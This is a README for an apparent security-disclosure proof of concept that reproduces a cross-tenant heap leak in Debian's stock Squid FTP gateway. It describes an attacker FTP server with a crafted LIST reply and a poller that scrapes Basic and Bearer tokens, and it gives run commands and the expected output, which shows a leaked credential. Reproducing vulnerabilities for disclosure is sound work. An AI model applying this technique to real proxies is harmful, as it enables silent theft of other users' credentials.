# SquidBleed — Proof of Concept

This directory is a self-contained, dockerized PoC for the Squid FTP gateway
cross-tenant HTTP request heap leak. It stands up a stock Squid proxy, a victim
web app, and an attacker, and demonstrates the attacker recovering a victim's
`Authorization: Basic …` credential out of the proxy's heap — without touching
the victim's connection.

The PoC reproduces byte-identically on Debian's stock `squid=5.7-2+deb12u5`.

## Layout

```
poc/
├── docker-compose.yml          squid + login-app services
├── squid/
│   ├── Dockerfile              debian:bookworm-slim + squid=5.7-2+deb12u5
│   └── squid_entrypoint.sh     drops the IPv6 host.docker.internal mapping and
│                               uncomments one line in the Debian squid.conf
├── login-app/
│   ├── Dockerfile              python:3.11-slim
│   └── login_app.py            victim SPA: HTTP Basic on /admin/accounts
├── attacker/
│   ├── evil_ftp.py             attacker FTP server (NetWare banner + crafted LIST)
│   └── attacker.py             parallel continuous poller / credential scraper
└── demo.mov                    end-to-end screen capture
```

No custom `squid.conf` is shipped — the container runs the Debian-default
`/etc/squid/squid.conf` verbatim. The only change applied at container start is
uncommenting `http_access allow localnet` (which Debian's own config tells admins
to uncomment), so the proxy is reachable from the Docker bridge network. Every
security-relevant directive (`memory_pools=on`, `ftp_passive=on`, `Safe_ports`,
…) stays at Debian defaults.

## Components

- **`squid/`** — Debian `squid=5.7-2+deb12u5` on port `3128`. Proxies HTTP and
  FTP for the RFC 1918 ranges the Docker bridge falls into (172.16.0.0/12).
- **`login-app/`** — a small SPA requiring HTTP Basic (`alice` /
  `i_love_c_programming`) on `/admin/accounts`, served on port `7777`. Its
  landing page seeds 55 `_ga_NN` analytics cookies scoped to `Path=/admin` via
  `document.cookie`, so the post-login XHR lands in the size bucket the leak
  draws from. This just removes the need to bring a pre-configured browser
  profile to reproduce.
- **`attacker/evil_ftp.py`** — answers the FTP control channel with a
  `220 NetWare …` banner and, on `LIST`, sends the single data-channel line
  `drwxr-xr-x 1 u g 0 Jan 01 12:34\r\n`. ~70 lines of stdlib Python, no deps.
  Takes an optional port argument (default `2222`).
- **`attacker/attacker.py`** — N polling threads (default 4, no inter-poll
  sleep) that fetch `ftp://evil/` through the proxy, scan each returned
  directory listing for `Basic`/`Bearer` tokens, and print each distinct value
  once. Continuous polling is what catches a one-shot victim request.

## Prerequisites

- Docker (Desktop on macOS, or Docker Engine on Linux — the compose file's
  `host-gateway` mapping makes `host.docker.internal` resolve on both).
- Python 3 on the host (for the two attacker scripts).
- A browser you can point at an HTTP proxy.

## Running the PoC

```bash
cd poc/

# terminal 1 — squid + login-app
docker compose up --build

# terminal 2 — attacker's FTP server (listens on host :2222)
python3 attacker/evil_ftp.py 2222

# terminal 3 — start the poller BEFORE the victim logs in
python3 attacker/attacker.py -t 4
```

Then, in a browser configured with HTTP proxy `<host>:3128` (HTTP proxy, **not**
SOCKS):

1. Load `http://<host>:7777/`.
2. Sign in as `alice` / `i_love_c_programming`.

The login submit issues a single `GET /admin/accounts` XHR carrying
`Authorization: Basic YWxpY2U6aV9sb3ZlX2NfcHJvZ3JhbW1pbmc=` plus the 55-cookie
jar (≈ 2.8 KB).

### Useful flags

```bash
python3 attacker/attacker.py -t 8                          # more poll threads
python3 attacker/attacker.py --target-proxy 1.2.3.4:3128   # non-local proxy
python3 attacker/attacker.py --ftp ftp://anon:x@host.docker.internal:2222/
python3 attacker/evil_ftp.py 4444                          # alternate FTP port
```

## Expected output

Within a fraction of a second of the login click, `attacker.py` prints the
victim's credential, reconstructed byte-for-byte from the percent-encoded
`href` in Squid's FTP directory-listing HTML:

```
[   T.TTs] [BASIC] YWxpY2U6aV9sb3ZlX2NfcHJvZ3JhbW1pbmc=
              decoded = alice:i_love_c_programming
[status    5.01s] polls=320 hits=128 rate=64.0/s  distinct: basic=1 bearer=0
```

No `[BASIC]` line appears before the victim acts. The attack is silent on the
Squid side — it serves a normal FTP directory listing with an ordinary
`200 OK` access-log entry, no crash, and nothing in `cache.log`.

`demo.mov` is a recording of this full sequence.
